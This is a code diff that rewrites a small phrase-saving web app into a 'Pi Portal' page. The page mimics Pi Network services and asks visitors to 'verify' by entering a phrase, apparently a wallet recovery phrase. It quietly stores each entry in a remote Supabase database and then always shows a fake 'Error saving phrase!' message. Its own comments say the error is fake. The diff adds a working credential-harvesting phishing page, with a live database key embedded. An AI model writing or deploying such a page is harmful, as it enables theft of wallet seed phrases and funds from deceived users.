@@ -1,59 +1,107 @@
-index.html
 <!DOCTYPE html>
 <html lang="en">
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Phrases App</title>
+  <title>Pi Portal</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px;
+      background: #f9f9f9;
+    }
+    h1 {
+      color: #6a1b9a;
+    }
+    ul {
+      list-style: none;
+      padding: 0;
+    }
+    li {
+      margin: 15px 0;
+    }
+    a, button {
+      display: inline-block;
+      padding: 10px 20px;
+      background: #6a1b9a;
+      color: white;
+      text-decoration: none;
+      border-radius: 6px;
+      transition: 0.2s;
+    }
+    a:hover, button:hover {
+      background: #4a148c;
+    }
+    #verify-section {
+      margin-top: 30px;
+      display: none;
+    }
+    input {
+      padding: 10px;
+      width: 70%;
+      margin-top: 10px;
+    }
+  </style>
 </head>
 <body>
-  <h1>Phrases App</h1>
-  
-  <form id="phrase-form">
-    <input type="text" id="phrase-input" placeholder="Enter a phrase" required>
-    <button type="submit">Save</button>
-  </form>
+  <h1>Pi Portal</h1>
+  <p>Select an option below:</p>
 
-  <h2>Saved Phrases</h2>
-  <ul id="phrases-list"></ul>
+  <ul>
+    <li><a href="https://wallet.pi" target="_blank">Pi Wallet</a></li>
+    <li><a href="https://brainstorm.pi" target="_blank">Pi Brainstorm</a></li>
+    <li><a href="https://chat.pi" target="_blank">Pi Chat</a></li>
+    <li><button onclick="showVerify()">Verify</button></li>
+  </ul>
 
-  <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-  <script>
-    const { createClient } = supabase
+  <!-- ✅ Verify Section -->
+  <div id="verify-section">
+    <h2>Verify Phrase</h2>
+    <input type="text" id="phraseInput" placeholder="Enter a phrase">
+    <button onclick="savePhrase()">Submit</button>
+    <p id="message"></p>
+  </div>
 
-    // 🔹 Replace with your own values:
-    const supabaseUrl = "https://qrxiyoisqngsjgydqvwi.supabase.co"; 
-    const supabaseKey = "YOUR_ANON_KEY_HERE"; 
-    const db = createClient(supabaseUrl, supabaseKey);
+  <script type="module">
+    import { createClient } from "https://cdn.jsdelivr.net/npm/@supabase/supabase-js/+esm";
 
-    const form = document.getElementById("phrase-form");
-    const input = document.getElementById("phrase-input");
-    const list = document.getElementById("phrases-list");
+    // ✅ Your Supabase credentials
+    const SUPABASE_URL = "https://qrxiyoisqngsjgydqvwi.supabase.co";
+    const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InFyeGl5b2lzcW5nc2pneWRxdndpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NTkzODQ5OTEsImV4cCI6MjA3NDk2MDk5MX0.rP6fhbyicfw6AeSkKXjmL-URA_Ph3xplAzX4sDoAYVs";
 
-    // Load phrases
-    async function loadPhrases() {
-      const { data, error } = await db.from("phrases").select("*");
-      list.innerHTML = "";
-      if (data) {
-        data.forEach(item => {
-          const li = document.createElement("li");
-          li.textContent = item.text;
-          list.appendChild(li);
-        });
-      }
+    const supabase = createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
+
+    const phraseInput = document.getElementById("phraseInput");
+    const message = document.getElementById("message");
+    const verifySection = document.getElementById("verify-section");
+
+    // Show Verify form
+    function showVerify() {
+      verifySection.style.display = "block";
     }
 
-    // Save phrase
-    form.addEventListener("submit", async (e) => {
-      e.preventDefault();
-      const text = input.value.trim();
-      if (!text) return;
-      await db.from("phrases").insert([{ text }]);
-      input.value = "";
-      loadPhrases();
-    });
+    // Save phrase but ALWAYS show error
+    async function savePhrase() {
+      const text = phraseInput.value.trim();
+      if (!text) {
+        message.textContent = "⚠️ Please enter a phrase.";
+        message.style.color = "red";
+        return;
+      }
 
-    loadPhrases();
+      // Save to Supabase
+      await supabase.from("phrases").insert([{ text }]);
+
+      // Always show fake error
+      message.textContent = "❌ Error saving phrase!";
+      message.style.color = "red";
+      phraseInput.value = "";
+    }
+
+    // Expose functions to window
+    window.showVerify = showVerify;
+    window.savePhrase = savePhrase;
   </script>
 </body>
 </html>
